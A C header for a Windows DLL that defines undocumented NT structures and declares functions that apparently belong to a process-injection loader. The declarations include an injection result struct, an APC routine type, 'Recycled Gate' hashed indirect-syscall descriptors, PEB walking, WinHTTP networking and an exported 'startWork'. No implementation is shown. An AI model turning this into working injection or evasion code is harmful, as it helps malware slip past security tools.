#pragma once

#ifdef __cplusplus
extern "C" {
#endif

#include <windows.h>
#include <stdio.h>
#include "Defines.h"
#include <stdlib.h>
#include <tchar.h>
#include <winhttp.h>
#include <string.h>
#include <time.h>
#include <wchar.h>
#include <locale.h>
#include <stdbool.h>
#include <fcntl.h>
#include <io.h>
#include <math.h>
#include <complex.h>

#pragma comment(lib, "winhttp.lib")


#define reg_Key _T("Orange Solutions")

#ifdef DLL_EXPORTS
#define DLL_API __declspec(dllexport)
#else
#define DLL_API __declspec(dllimport)
#endif

typedef VOID(KNORMAL_ROUTINE) (
    IN PVOID NormalContext,
    IN PVOID SystemArgument1,
    IN PVOID SystemArgument2);

typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

typedef struct _ReSult_IJ {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
    DWORD dwSuccess;
} INJ_Resul, * Result_;

typedef struct CheckSelfInfo {
    TCHAR path[MAX_PATH];
    TCHAR name[MAX_PATH];
} CheckSelf;


void* mycpy(void* dest, const void* src, size_t n);
wchar_t* DecodeToWString(wchar_t* szInput);
wchar_t* CheckLog(const wchar_t* dllPath, PWSTR arguments);
wchar_t* CheckIn(const BYTE* data, SIZE_T size, PWSTR arguments);

DLL_API int startWork();


#ifdef __cplusplus
} 
#endif



#define FAIL 0
#define SUCCESS 1

#define HASH_KEY 0x41424344
#define SYS_STUB_SIZE 32

#define UP -32
#define DOWN 32

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
typedef struct {

	DWORD dwSyscallNr;
	PVOID pRecycledGate;

} callDescriptor;

typedef struct _UNICODE_STR {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;





typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


PVOID findIt(void);
WCHAR* toLower(WCHAR* str);




DWORD GetCall(DWORD crypted_hash, callDescriptor* pSyscall);

unsigned long exponentIT(const wchar_t* str);
unsigned long Jb2(unsigned char* str);
unsigned long CheckIntegrit(unsigned long hash);


#define RTL_MAX_DRIVE_LETTERS 32
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
	USHORT                  Flags;
	USHORT                  Length;
	DWORD                   TimeStamp;
	UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;
} CURDIR, * PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PWCHAR Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG_PTR EnvironmentSize;
	ULONG_PTR EnvironmentVersion;
	PVOID PackageDependencyData;
	ULONG ProcessGroupId;
	ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_FREE_BLOCK {
	struct _PEB_FREE_BLOCK* Next;
	DWORD                   Size;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef void (*PPEBLOCKROUTINE)(
	PVOID PebLock
	);

typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	DWORD                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	DWORD                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	DWORD                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
	DWORD                   Length;
	BOOLEAN                 Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBaseAddress;
	PPEB_LDR_DATA           Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PPEBLOCKROUTINE         FastPebLockRoutine;
	PPEBLOCKROUTINE         FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PPEB_FREE_BLOCK         FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, * PPEB;

typedef LONG       KPRIORITY;

typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	INT_PTR AffinityMask;
	KPRIORITY BasePriority;
	INT_PTR UniqueProcessId;
	INT_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef enum _PS_CREATE_STATE {
	PsCreateInitialState,
	PsCreateFailOnFileOpen,
	PsCreateFailOnSectionCreate,
	PsCreateFailExeFormat,
	PsCreateFailMachineMismatch,
	PsCreateFailExeName, 
	PsCreateSuccess,
	PsCreateMaximumStates
} PS_CREATE_STATE;

typedef struct _PS_CREATE_INFO
{
	SIZE_T Size;
	PS_CREATE_STATE State;
	union
	{
		
		struct
		{
			union
			{
				ULONG InitFlags;
				struct
				{
					UCHAR WriteOutputOnExit : 1;
					UCHAR DetectManifest : 1;
					UCHAR IFEOSkipDebugger : 1;
					UCHAR IFEODoNotPropagateKeyState : 1;
					UCHAR SpareBits1 : 4;
					UCHAR SpareBits2 : 8;
					USHORT ProhibitedImageCharacteristics : 16;
				} s1;
			} u1;
			ACCESS_MASK AdditionalFileAccess;
		} InitState;

		
		struct
		{
			HANDLE FileHandle;
		} FailSection;

		
		struct
		{
			USHORT DllCharacteristics;
		} ExeFormat;

		
		struct
		{
			HANDLE IFEOKey;
		} ExeName;

		
		struct
		{
			union
			{
				ULONG OutputFlags;
				struct
				{
					UCHAR ProtectedProcess : 1;
					UCHAR AddressSpaceOverride : 1;
					UCHAR DevOverrideEnabled : 1; 
					UCHAR ManifestDetected : 1;
					UCHAR ProtectedProcessLight : 1;
					UCHAR SpareBits1 : 3;
					UCHAR SpareBits2 : 8;
					USHORT SpareBits3 : 16;
				} s2;
			} u2;
			HANDLE FileHandle;
			HANDLE SectionHandle;
			ULONGLONG UserProcessParametersNative;
			ULONG UserProcessParametersWow64;
			ULONG CurrentParameterFlags;
			ULONGLONG PebAddressNative;
			ULONG PebAddressWow64;
			ULONGLONG ManifestAddress;
			ULONG ManifestSize;
		} SuccessState;
	};
} PS_CREATE_INFO, * PPS_CREATE_INFO;

typedef struct _PS_ATTRIBUTE
{
	ULONG_PTR Attribute;                
	SIZE_T Size;                       
	union
	{
		ULONG_PTR Value;                
		PVOID ValuePtr;                
	};
	PSIZE_T ReturnLength;              
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;                
	PS_ATTRIBUTE Attributes[2];        
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef enum _PS_PROTECTED_SIGNER {
	PsProtectedSignerNone,
	PsProtectedSignerAuthenticode,
	PsProtectedSignerCodeGen,
	PsProtectedSignerAntimalware,
	PsProtectedSignerLsa,
	PsProtectedSignerWindows,
	PsProtectedSignerWinTcb,
	PsProtectedSignerMax
} PS_PROTECTED_SIGNER;

typedef enum _PS_ATTRIBUTE_NUM {
	PsAttributeParentProcess,           // 0
	PsAttributeDebugPort,               // 1
	PsAttributeToken,                   // 2
	PsAttributeClientId,                // 3
	PsAttributeTebAddress,              // 4
	PsAttributeImageName,               // 5
	PsAttributeImageInfo,               // 6
	PsAttributeMemoryReserve,           // 7
	PsAttributePriorityClass,           // 8
	PsAttributeErrorMode,               // 9
	PsAttributeStdHandleInfo,           // 10
	PsAttributeHandleList,              // 11
	PsAttributeGroupAffinity,           // 12
	PsAttributePreferredNode,           // 13
	PsAttributeIdealProcessor,          // 14
	PsAttributeUmsThread,               // 15
	PsAttributeMitigationOptions,       // 16
	PsAttributeProtectionLevel,         // 17
	PsAttributeSecureProcess,           // 18
	PsAttributeJobList,                 // 19
	PsAttributeChildProcessPolicy,      // 20
	PsAttributeAllApplicationPackagesPolicy, // 21
	PsAttributeWin32kFilter,            // 22
	PsAttributeSafeOpenPromptOriginClaim,   // 23
	PsAttributeBnoIsolation,            // 24
	PsAttributeDesktopAppPolicy,        // 25
	PsAttributeChpe,                    // 26
	PsAttributeMitigationAuditOptions,  // 27
	PsAttributeMachineType,             // 28
	PsAttributeComponentFilter,         // 29
	PsAttributeEnableOptionalXStateFeatures, // 30
	PsAttributeCreateStore,             // 31
	PsAttributeAllowTelemetry,          // 32
	PsAttributeSubsystemProcess,        // 33
	PsAttributeJobMemoryLimit,          // 34
	PsAttributeChildJobList,            // 35
	PsAttributeIoPriority,              // 36
	PsAttributePagePriority,            // 37
	PsAttributeProtectionLevelEx,       // 38
	PsAttributeSecureState,             // 39
	PsAttributeCreateSession,           // 40
	PsAttributeMax
} PS_ATTRIBUTE_NUM;



#define PS_ATTRIBUTE_NUMBER_MASK 0x0000ffff
#define PS_ATTRIBUTE_THREAD 0x00010000 
#define PS_ATTRIBUTE_INPUT 0x00020000 
#define PS_ATTRIBUTE_ADDITIVE 0x00040000 

#define PsAttributeValue(Number, Thread, Input, Additive) \
    (((Number) & PS_ATTRIBUTE_NUMBER_MASK) | \
    ((Thread) ? PS_ATTRIBUTE_THREAD : 0) | \
    ((Input) ? PS_ATTRIBUTE_INPUT : 0) | \
    ((Additive) ? PS_ATTRIBUTE_ADDITIVE : 0))


#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002 // ?
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
#define THREAD_CREATE_FLAGS_HAS_SECURITY_DESCRIPTOR 0x00000010 // ?
#define THREAD_CREATE_FLAGS_ACCESS_CHECK_IN_TARGET 0x00000020 // ?
#define THREAD_CREATE_FLAGS_INITIAL_THREAD 0x00000080


#define RTL_USER_PROCESS_PARAMETERS_NORMALIZED              0x01

#define RTL_USER_PROCESS_PARAMETERS_PROFILE_USER            0x02
#define RTL_USER_PROCESS_PARAMETERS_PROFILE_KERNEL          0x04
#define RTL_USER_PROCESS_PARAMETERS_PROFILE_SERVER          0x08
#define RTL_USER_PROCESS_PARAMETERS_UNKNOWN                 0x10
#define RTL_USER_PROCESS_PARAMETERS_RESERVE_1MB             0x20
#define RTL_USER_PROCESS_PARAMETERS_RESERVE_16MB            0x40
#define RTL_USER_PROCESS_PARAMETERS_CASE_SENSITIVE          0x80
#define RTL_USER_PROCESS_PARAMETERS_DISABLE_HEAP_CHECKS     0x100
#define RTL_USER_PROCESS_PARAMETERS_PROCESS_OR_1            0x200
#define RTL_USER_PROCESS_PARAMETERS_PROCESS_OR_2            0x400
#define RTL_USER_PROCESS_PARAMETERS_PRIVATE_DLL_PATH        0x1000
#define RTL_USER_PROCESS_PARAMETERS_LOCAL_DLL_PATH          0x2000
#define RTL_USER_PROCESS_PARAMETERS_IMAGE_KEY_MISSING       0x4000

#define RTL_USER_PROCESS_PARAMETERS_DEVOVERRIDE_ENABLED     0x8000

#define RTL_USER_PROCESS_PARAMETERS_NX                      0x20000

typedef struct _RTL_RELATIVE_NAME_U {
	UNICODE_STRING RelativeName;      
	HANDLE ContainingDirectory;        
	PVOID CurDirRef;                  
} RTL_RELATIVE_NAME_U, * PRTL_RELATIVE_NAME_U;






